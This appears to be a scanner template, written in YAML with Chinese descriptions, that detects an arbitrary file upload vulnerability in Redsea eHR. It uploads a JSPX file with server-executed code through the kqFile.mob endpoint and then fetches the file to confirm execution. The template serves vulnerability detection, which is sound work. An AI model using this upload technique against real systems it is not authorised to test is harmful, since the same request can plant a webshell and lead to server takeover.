id: hr-soft-ehr-file-upload
info:
  name: 红海云 eHR - 任意文件上传漏洞
  author: Chaitin
  severity: medium
  description: |
    该模板用于检测 红海云 eHR - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/RedseaPlatform/kqFile.mob?method=uploadFile&fileName=123.jspx`、`/uploadfile/{{uploadfilename}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-1382961
    vendor: hr_soft
    product: ehr
  tags: fileupload,vuln,ehr
variables:
  s1: '{{rand_int(1000000, 2000000)}}'
  s2: '{{rand_int(1000000, 2000000)}}'
  rBoundary: '{{to_lower(rand_text_alpha(8))}}'
flow: http(1) && http(2)
http:
  - method: POST
    path:
      - '{{BaseURL}}/RedseaPlatform/kqFile.mob?method=uploadFile&fileName=123.jspx'
    redirects: false
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rBoundary}}
    body: |
      ------WebKitFormBoundary{{rBoundary}}
      Content-Disposition: form-data; name="fj_file"; filename="test.jpg"

      <jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page"><jsp:directive.page contentType="text/html"/><jsp:directive.page pageEncoding="UTF-8"/><jsp:scriptlet><![CDATA[out.print({{s1}}+{{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();]]></jsp:scriptlet></jsp:root>
      ------WebKitFormBoundary{{rBoundary}}--
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
        internal: true
    extractors:
      - type: regex
        name: uploadfilename
        part: body
        group: 1
        regex:
          - '(/.+?jspx)'
        internal: true
  - method: GET
    path:
      - '{{BaseURL}}/uploadfile/{{uploadfilename}}'
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, to_string(s1 + s2))'
